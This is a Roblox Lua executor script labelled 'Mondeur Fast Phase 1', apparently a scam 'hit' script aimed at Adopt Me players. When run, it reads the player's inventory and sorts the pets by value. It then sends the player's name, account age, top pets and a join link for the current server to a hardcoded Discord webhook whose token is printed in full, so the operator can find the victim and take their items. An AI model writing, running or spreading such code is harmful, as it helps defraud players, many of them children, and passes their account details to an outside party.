-- [[ MONDEUR FAST PHASE 1 ]] --
print("Mondeur: Initializing Phase 1...")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"

-- Fast Load Check
local Fsys = ReplicatedStorage:FindFirstChild("Fsys")
if not Fsys then 
    print("Mondeur: Waiting for Fsys...")
    Fsys = ReplicatedStorage:WaitForChild("Fsys", 30) 
end

local Fsys2 = require(Fsys)
local InventoryDB = Fsys2.load("InventoryDB")
print("Mondeur: Modules Loaded.")

-- High-Speed Scan
local function execute_hit()
    print("Mondeur: Scanning Inventory...")
    local ok, inv = pcall(function() 
        return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() 
    end)

    if not ok or not inv then 
        print("Mondeur: Failed to get inventory.")
        return 
    end

    local pets = {}
    local totalVal = 0
    for _, item in pairs(inv) do
        if item.Kind == "Pet" then
            local db = InventoryDB.pets[item.id]
            local val = (item.properties and item.properties.value) or 0
            table.insert(pets, {name = (db and db.name) or item.id, value = val})
            totalVal = totalVal + val
        end
    end
    table.sort(pets, function(a, b) return a.value > b.value end)
    print("Mondeur: Found " .. #pets .. " pets. Total: " .. totalVal)

    -- Webhook Design (Clean & Direct)
    local lootLines = ""
    for i = 1, 15 do
        if not pets[i] then break end
        lootLines = lootLines .. "⭐ **" .. pets[i].name .. "** — `" .. pets[i].value .. "`\n"
    end

    local payload = {
        username = "Mondeur Hub | Hit",
        embeds = {{
            title = "MondeurOnTop • ADM Hit [ 🌊 ]",
            color = 3447003,
            description = "👤 **User:** " .. LocalPlayer.Name .. "\n📅 **Age:** " .. LocalPlayer.AccountAge .. " Days\n💰 **Total Pts:** " .. totalVal,
            fields = {
                {name = "📦 **Top Items**", value = (lootLines ~= "" and lootLines or "None"), inline = false},
                {name = "🌐 **Server**", value = "[**Join Server**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")", inline = true}
            },
            footer = {text = "Mondeur Fast Mode | " .. os.date("%X")}
        }}
    }

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        print("Mondeur: Sending Webhook...")
        local res = request({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
        print("Mondeur: Webhook Response: " .. (res and res.StatusCode or "No Response"))
    end
end

-- Execute
task.spawn(execute_hit)
